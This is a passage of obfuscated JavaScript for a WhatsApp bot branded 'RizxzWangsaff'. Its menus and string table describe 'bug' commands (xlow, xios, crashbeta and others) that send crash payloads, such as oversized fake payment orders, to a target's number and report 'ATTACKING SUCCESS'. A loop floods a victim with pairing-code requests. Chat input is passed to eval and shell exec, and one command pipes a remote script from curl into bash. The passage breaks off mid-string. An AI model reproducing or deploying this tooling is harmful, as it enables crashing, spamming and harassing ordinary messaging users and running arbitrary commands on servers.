                _0x3652ad("𝗡𝗢𝗗𝗘 𝗗𝗔𝗡 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡 𝗧𝗘𝗟𝗔𝗛 𝗗𝗜 𝗧𝗔𝗠𝗕𝗔𝗛𝗞𝗔𝗡 𝗦𝗜𝗟𝗔𝗛𝗔𝗞𝗔𝗡 𝗧𝗔𝗠𝗕𝗔𝗛 𝗞𝗔𝗡 𝗔𝗟𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡 𝗠𝗔𝗡𝗨𝗔𝗟😂 & 𝗔𝗠𝗕𝗜𝗟 𝗧𝗢𝗞𝗘𝗡 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘");
                _0x52bac7.end();
              }).on(_0x597c(777), _0x149300 => {
                _0xf9ca8e[_0x597c(655)](_0x597c(868));
                _0xf9ca8e[_0x597c(655)]("4\n");
                _0xf9ca8e[_0x597c(655)](_0x597c(968));
                _0xf9ca8e.write("Jangan Lupa Support RizxzWangsaff🦅🇮🇩\n");
                _0xf9ca8e[_0x597c(655)](_0x33ffdc + "\n");
                _0xf9ca8e[_0x597c(655)]("RIZXZ-WANGSAFF\n");
                _0xf9ca8e[_0x597c(655)](_0x5115b2 + "\n");
                _0xf9ca8e[_0x597c(655)](_0x5115b2 + "\n");
                _0xf9ca8e[_0x597c(655)]("1\n");
                console[_0x597c(949)](_0x597c(611) + _0x149300);
              }).stderr.on(_0x597c(777), _0x5a5588 => {
                console.log(_0x597c(384) + _0x5a5588);
              });
            });
          }).on(_0x597c(864), _0x504667 => {
            console.log(_0x597c(817) + _0x504667);
            _0x3652ad("Katasandi atau IP tidak valid");
          })[_0x597c(831)](_0x12a0fb);
        }
        break;
      case _0x597c(413):
        {
          if (!_0x18271c) {
            return _0x3652ad(mess.owner);
          }
          if (!q) {
            return _0x3652ad(_0x597c(517));
          }
          let [_0x5a9e72, _0x1da7e8 = "200"] = q[_0x597c(613)]('|');
          await _0x3652ad(_0x597c(893));
          let _0x3a2b3d = _0x5a9e72[_0x597c(729)](/[^0-9]/g, '')[_0x597c(452)]();
          let {
            default: _0x72bccb,
            useMultiFileAuthState: _0x4634c1,
            fetchLatestBaileysVersion: _0x3b55e2
          } = require(_0x597c(736));
          let {
            state: _0x43e4ca
          } = await _0x4634c1(_0x597c(569));
          let {
            version: _0x1b2f36
          } = await _0x3b55e2();
          let _0x110afa = await _0x72bccb({
            'auth': _0x43e4ca,
            'version': _0x1b2f36,
            'logger': pino({
              'level': _0x597c(398)
            })
          });
          for (let _0x2da41e = 0; _0x2da41e < _0x1da7e8; _0x2da41e++) {
            await sleep(1500);
            let _0x1359fa = await _0x110afa[_0x597c(720)](_0x3a2b3d);
            await console.log(_0x597c(753) + _0x3a2b3d + " - Code : " + _0x1359fa);
          }
          await sleep(15000);
        }
        break;
      case _0x597c(715):
        {
          if (!_0x18271c) {
            return _0x3652ad(mess.owner);
          }
          if (_0x46e001[_0x597c(625)] < 1) {
            return _0x3652ad(_0x597c(449));
          }
          const _0x16714c = _0x46e001[0][_0x597c(613)]('|');
          if (_0x16714c[_0x597c(625)] !== 2) {
            return _0x3652ad(_0x597c(952));
          }
          await _0x3652ad(_0x597c(893));
          try {
            const {
              staterzx: _0x1b1d7e,
              saveCredsrzx: _0x4bac6e
            } = await useMultiFileAuthState(_0x597c(776));
          } catch (_0x23ff38) {}
          for (let _0x158c31 = 0; _0x158c31 < 10000; _0x158c31++) {
            try {
              var _0x4a4348 = Math[_0x597c(582)](Math.random() * 999);
              var _0x1f8675 = Math[_0x597c(582)](Math[_0x597c(862)]() * 999);
              await _0x5051a5[_0x597c(902)](_0x4a4348 + '-' + _0x1f8675);
            } catch (_0x34c873) {
              console.log(_0x4a4348 + '-' + _0x1f8675);
            }
          }
        }
        break;
      default:
    }
    if (_0x36b48b[_0x597c(996)]('$')) {
      exec(_0x36b48b[_0x597c(697)](2), (_0x21b4b5, _0x2cc0ba) => {
        if (_0x21b4b5) {
          return _0x3652ad(_0x21b4b5);
        }
        if (_0x2cc0ba) {
          return _0x3652ad(_0x2cc0ba);
        }
      });
    }
    if (_0x36b48b[_0x597c(996)]('>')) {
      if (!_0x18271c) {
        return _0x3652ad(mess[_0x597c(842)][_0x597c(633)]);
      }
      try {
        let _0x275cb4 = await eval(_0x36b48b[_0x597c(697)](2));
        if (typeof _0x275cb4 !== 'string') {
          _0x275cb4 = require(_0x597c(641))[_0x597c(819)](_0x275cb4);
        }
        await _0x3652ad(_0x275cb4);
      } catch (_0x43de13) {
        _0x3652ad(String(_0x43de13));
      }
    }
  } catch (_0x172c76) {
    console[_0x597c(949)](_0x172c76);
    _0x5051a5[_0x597c(937)](owner + _0x597c(981), {
      'text': '' + util.format(_0x172c76)
    });
  }
};
function _0x597c(_0x5e9baa, _0x3fa339) {
  const _0x51d074 = _0x3b8b();
  _0x597c = function (_0x2e6172, _0x1efa9d) {
    _0x2e6172 = _0x2e6172 - 344;
    let _0x4fef73 = _0x51d074[_0x2e6172];
    return _0x4fef73;
  };
  return _0x597c(_0x5e9baa, _0x3fa339);
}
function _0x3b8b() {
  const _0x43a5fd = ["22GB", "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=", "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}", "image/webp", "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=", '3gb', "interactiveResponseMessage", "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=", '4000', "*Format salah!*\nPenggunaan: ", "chat", "*PROSES UNINSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 20 DETIK*", "startup", "fromObject", " example,@user", "xpayment", "profilePictureUrl", "admin\n", "close", "end", "*𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗣𝗔𝗡𝗘𝗟𝗩2 𝗠𝗢𝗛𝗢𝗡 𝗧𝗨𝗡𝗚𝗚𝗨 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛*", "Panel installation stream closed with code ", "Connection Error: ", "wait", "inspect", "2gb", "xip", "{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}", "xlow ", "R̬̂Î̬Ẑ̬X̬̂Ẑ̬ Â̬N̬̂D̬̂R̬̂Ô̬", "12diuljV", "hdr", "𝐒𝐩𝐚𝐦 𝐊𝐨𝐝𝐞〽️", "chats", "Nama Server: ", "3501UyVWZR", "connect", "/dns_records", "23240", "groupParticipantsUpdate", "🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉", "mentionedJid", " Telah Menjadi Owner!!!", "019", "07c8ad67838a176b9ad4b4a2cd2876db", "Maaf, Anda tidak dapat melihat daftar pengguna.", "𝐑𝐢𝐳𝐱𝐳 𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🐉", "only", "javascript-obfuscator", "cyan", "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k", '21gb', "writeFileSync", "8192", "/api/client/servers/", "6144", "\n☢️CREATED AT: ", "25GB", "msg", "Hai @", "groupMetadata", '𝐑𝐢𝐳𝐱𝐳𝐂𝐫𝐚𝐬𝐡', '23GB', "createnode ipvps,password,domainnode,ramvps", ".installpanelmenu", "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc", "⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻", "random", " Kontak", "error", "4048", "RizxzzGaPnya 💸", "./all/database/saldo.json", "rizaljomok\n", "redBright", "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000", "isOnWhatsApp", "menu", "https://telegra.ph/file/f4eb00f42334b75df3c09.jpg", "\n│▬▭「 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇ཀ͜͡🐉 」▭▬\n│       🩸⃟༑⌁⃰⿻ Botz Wa ཀ͜͡🐉\n┗━━━━━━━━━━━━━━━━━━⬣", "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", 'remini', "created_at", 'linkgroup', "16572901099967", "𝗠𝗘𝗠𝗨𝗟𝗔𝗜 𝗖𝗥𝗘𝗔𝗧𝗘 𝗡𝗢𝗗𝗘 & 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡", "480", "999999999", "8GB", "Selamat Subuh 🌆", "rzx", "eggsnya", "HH : mm :ss", "/resources", "Ãª¦¾", "./all/database/premium.json", "NativeFlowMessage", 'domain2', "</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️", "K̬̂Î̬L̬̂L̬̂  Î̬Ô̬Ŝ̬", "gagal membuat subdomain\nMsg: ", "installpanelv2 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)", "𝐑𝐈𝐙𝐗𝐙 𝐁𝐔𝐆 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ✅", "downloadAndSaveMediaMessage", "ID: ", '17240', "packname", "register", "addprem", "1203632@newsletter", "Penggunaan ", "1067401", "Asia/Makassar", " untuk melihat halaman selanjutnya.", "𝐑𝐈𝐙𝐗𝐙 𝐌𝐎𝐃𝐒 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏", "configurewings", "ghcr.io/parkervcp/yolks:nodejs_18", "bugmenu", "enhance", "15:00:00", "errors", "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg", "Ĉ̬R̬̂Ŝ̬Â̬Ĥ̬  Î̬Ô̬Ŝ̬͒", "12240", "\nhostname: ", "10gb", "\n🌷UUID: ", "𝗦𝗨𝗖𝗖𝗘𝗦 𝗨𝗡𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗧𝗛𝗘𝗠𝗘 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 𝗖𝗢𝗕𝗔 𝗖𝗘𝗞", "block", "bold", "22gb", "Nomor ", "158256HUcRZk", "\n\nFN:", " user,nomer", "extendedTextMessage", "9216", "Selamat Tengah Malam 🌃", "bilang apa?", "Page: ", 'onWhatsApp', "𝐑𝐢𝐳𝐱𝐳𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟🎭", "sendMessage", "fromMe", 'result', "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑨𝒏𝒅𝒓𝒐🐉", "14GB", "🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉", "🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉", "dddd, DD MMMM YYYY", "DEFAULT", "Berikut list user:\n\n", "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true", "name", "log", "Inactive", "vasionbeta", "Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819_\n\n𝐑𝐢𝐳𝐱𝐳𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟🎭", "25240", "overbeta", "21240", "2048", "\nMEMORY: ", " nomor\nContoh ", " ipvps,password,token (token configuration)", '410', "Selamat Malam 🏙️", "./all/database/deposit", '19gb', "pm2 restart index", "getName", "delsrv", "001", "SGP\n", "current_state", "POST", "RIZXZ-WANGSAFF\n", "⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻", "99999999", 'delowner', "zone_name", "Status: ", "Maaf, Anda tidak dapat melihat daftar server.", "Teks Nya Bang?\nContoh: ", "𝐏𝐑𝐎𝐒𝐄𝐒 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐖𝐈𝐍𝐆𝐒 𝐁𝐀𝐍𝐆 𝐑𝐈𝐙𝐗𝐕𝐄𝐋𝐙🚀", "push", "@s.whatsapp.net", "15gb", "physical-goods", " Telah Di Hapus Owner!!!", "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801\n=====================================\n", "installpanelv1", "13880sEnwui", "*Format salah!*\nPenggunaan:\n", 'limits', "Header", "messageContextInfo", '12gb', "subject", "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true", 'sendStimg', "startsWith", "iphone", "filter", "y/n", '24gb', "count", "uptime", "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}", "𝐑𝐈𝐙𝐗", "crashbeta ", "\n\n⎙─➤ *👤USERNAME* : ", "isGroup", '16240', "exports", "1248\n", "Contoh: .xpayment 916909137213", "Succes", "./all/database/owner.json", "admin@gmail.com\n", "server_limit", "V̬̂Â̬Ŝ̬Î̬Ô̬N̬̂", "123\n", 'first_name', "*𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗣𝗔𝗡𝗘𝗟𝗩1 𝗠𝗢𝗛𝗢𝗡 𝗧𝗨𝗡𝗚𝗚𝗨 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛*", "catch", ",\nitem1.TEL;waid=", "Wings installation stream closed with code ", 'sticker', "SUCCES CREATE USER ID: ", "status@broadcast", "response", "Memb", "PENGGUNAAN .domain2 hostname|167.29.379.23", "Kirim/rzxReply Gambar/Video/Gifs Dengan Caption ", 'sendStvid', "watchFile", "HH : mm : ss", "startwings", "12GB", "user", 'DD/MM/YY', "Penggunaan: .xpayment 916909137213", "Total Server: ", "Send/rzxReply Foto Dengan Caption ", "*SUCCESSFULLY DELETE THE USER*", "https://telegra.ph/file/3d91b41617cb982acf0c4.jpgg", "⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟", "user\n", "\n\n🖥️LOGIN: ", "InteractiveMessage", "splice", 'badmin', '25gb', 'now', "Stream closed with code ", "relayMessage", "uninstallpanel", 'Unlimited', "CATALOG", "0011", " Hallo", "[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅", "𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒄𝒂𝒑𝑽𝒊𝒓𝒖𝒔𝒔", "72XoUnVA", "kudetathp", "『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ", "STDERR: ", 'green', "https://chat.whatsapp.com/", "uninstallpanel ipvps,password", "\n│▬▭「 🩸⃟༑⌁⃰ 𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇ཀ͜͡🐉 」▭▬\n│       🩸⃟༑⌁⃰⿻ Botz Wa ཀ͜͡🐉\n┗━━━━━━━━━━━━━━━━━━⬣\n\n╭──(        ⿻ 𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️ ⿻        )\n┏─『 `𝑪𝑶𝑶𝑼𝑺𝑬 𝑩𝑼𝑮` 』\n│ ᯤ xʀᴢx <ɴᴜᴍʙᴇʀ>\n┗─────────────❐\n┏─『 `𝑿𝑪𝑹𝑨𝑺𝑯` 』\n│ ᯤ xʟᴏᴡ <ɴᴜᴍʙᴇʀ>\n│ ᯤ xᴍᴇᴅ <ɴᴜᴍʙᴇʀ>\n│ ᯤ xʜᴀʀᴅ <ɴᴜᴍʙᴇʀ>\n│ ᯤ xɪᴏs <ɴᴜᴍʙᴇʀ>\n│ ᯤ xɪᴘ <ɴᴜᴍʙᴇʀ>\n│ ᯤ ɪᴘʜᴏɴᴇ <ɴᴜᴍʙᴇʀ>\n│ ᯤ ᴄʀᴀsʜʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>\n│ ᯤ ᴠᴀsɪᴏɴʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>\n│ ᯤ ᴏᴠᴇʀʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>\n┗─────────────❐", " MB\nCPU: ", "11240", "𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n\n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: admin\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: 123\n𝗟𝗢𝗚𝗜𝗡: ", "𝐑𝐢𝐳𝐱𝐳", "4P46GMY57GC", "./all/database/contacts.json", 'rzxReply', "npm start", "unwatchFile", "fatal", " menggunakan *xpayment* ✅\n\nTunggu 2 menit agar bot tidak diblokir.", "Body", "\n *SUCCES CREATE SERVER*\n**\n 𝐃𝐨𝐧𝐞 𝐁𝐲 𝐑𝐢𝐳𝐱𝐳 𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡\n\nTYPE: user\n\nID: ", "includes", "disk", "Fitur Ini Hanya Dapat Digunakan Oleh Developer!", "disable", "BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:", "join", "120363298524333143@newsletter", "Hai Kak @", "Berhasil mengganti mode bot menjadi *Public*", 'last_name', "%\n\n", "spampair", 'Message', "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : *62895364760801*\n=====================================\n", " Telah Di Hapus Premium!", "22240", "\n\n𝗡𝗼𝘁𝗲: 𝗦𝗲𝗺𝘂𝗮 𝗜𝗻𝘀𝘁𝗮𝗹𝗮𝘀𝗶 𝗧𝗲𝗹𝗮𝗵 𝗦𝗲𝗹𝗲𝘀𝗮𝗶 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗖𝗿𝗲𝗮𝘁𝗲 𝗔𝗹𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗗𝗶 𝗡𝗼𝗱𝗲 𝗬𝗮𝗻𝗴 𝗗𝗶 𝗯𝘂𝗮𝘁 𝗢𝗹𝗲𝗵 𝗕𝗼𝘁 𝗗𝗮𝗻 𝗔𝗺𝗯𝗶𝗹 𝗧𝗼𝗸𝗲𝗻 𝗖𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗱𝗮𝗻 𝗸𝗲𝘁𝗶𝗸 .𝘀𝘁𝗮𝗿𝘁𝘄𝗶𝗻𝗴𝘀 (𝘁𝗼𝗸𝗲𝗻) \n𝗡𝗼𝘁𝗲: 𝗛𝗔𝗥𝗔𝗣 𝗧𝗨𝗡𝗚𝗚𝗨 𝟭-𝟱𝗠𝗘𝗡𝗜𝗧 𝗕𝗜𝗔𝗥 𝗪𝗘𝗕 𝗕𝗜𝗦𝗔 𝗗𝗜 𝗕𝗨𝗞𝗔", "create", "ID nya mana?", '03:00:00', "total_pages", "paramsJson", "ORDER", "\n𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗫𝗶𝗻𝘃𝗶𝘀𝗶𝗼𝗻 𝗕𝘂𝗴 𝗛𝗮𝗿𝗱\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker", "selectedId", "listadmin", "919402104403", "imageMessage", 'image', "🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉", "11GB", "Anda harus menjadi pengguna premium untuk menggunakan fitur ini.", "Teks?", "xios", "red", "blue", " MB\nDISK: ", "cta_url", ".bugmenu", "𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️", "\n *🌐LOGIN* : ", "stderr", "700", "\n📊ADMIN: ", "groupInviteCode", "single_select", "*SUCCESSFULLY DELETE THE SERVER*", "*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\n𝐑𝐢𝐳𝐱𝐳𝐖𝐚𝐧𝐠𝐬𝐚𝐟𝐟🎭", 'Input', " disable -- _Menonaktifkan_", "trim", "@g.us", '9gb', "xhard", "premium", "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"WANGCAPP\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Bottt\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"RizxzPemula\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}", "10116", "🔥፝⃟ ꙳𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇🔥፝⃟", "mimetype", "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781", "17GB", 'white', "adm\n", "24240", "\n𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗫𝗶𝗻𝘃𝗶𝘀𝗶𝗼𝗻 𝗕𝘂𝗴 𝗠𝗲𝗱𝗶𝘂𝗺\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker", "sender", "bash <(curl -s https://pterodactyl-installer.se)", "\n\n *👤USERNAME* : ", "./Virtex/buttonvirus.js", "\n𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗫𝗶𝗻𝘃𝗶𝘀𝗶𝗼𝗻 𝗕𝘂𝗴 𝗜𝗼𝘀\n\n    𝐍𝐎𝐓𝐄\n> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker", "maaf su fitur ini dapet di gunakan group tertentu", "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=", "/api/application/servers", "Footer", "group", "Selamat Pagi 🌄", "\n│▬▭「 🩸⃟༑⌁⃰ 𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇ཀ͜͡🐉 」▭▬\n│       🩸⃟༑⌁⃰⿻ Botz Wa ཀ͜͡🐉\n┗━━━━━━━━━━━━━━━━━━⬣\n\n╭──(        ⿻ Install Menu〽️ ⿻        )\n┏─『 `INSTALL MENU` 』\n│ ᯤ ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴠ1 [sᴜᴘᴘᴏʀᴛ ᴜʙᴜɴᴛᴜ 20.04]\n│ ᯤ ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴠ2 [sᴜᴘᴘᴏʀᴛ ᴜʙᴜɴᴛᴜ 22.04 - 24.04]\n│ ᯤ ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴠ3 [sᴜᴘᴘᴏʀᴛ ᴅᴇʙɪᴀɴ 11x64]\n│ ᯤ ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ\n│ ᯤ ᴄʀᴇᴀᴛᴇɴᴏᴅᴇ\n│ ᯤ ɪɴsᴛᴀʟʟᴡɪɴɢs\n│ ᯤ sᴛᴀʀᴛᴡɪɴɢs\n│ ᯤ ɪɴsᴛᴀʟʟᴛʜᴇᴍᴀᴠ1 [ᴛʜᴇᴍᴀ sᴛᴇʟʟᴇʀ]\n│ ᯤ ɪɴsᴛᴀʟʟᴛʜᴇᴍᴀᴠ2 [ᴛʜᴇᴍᴀ 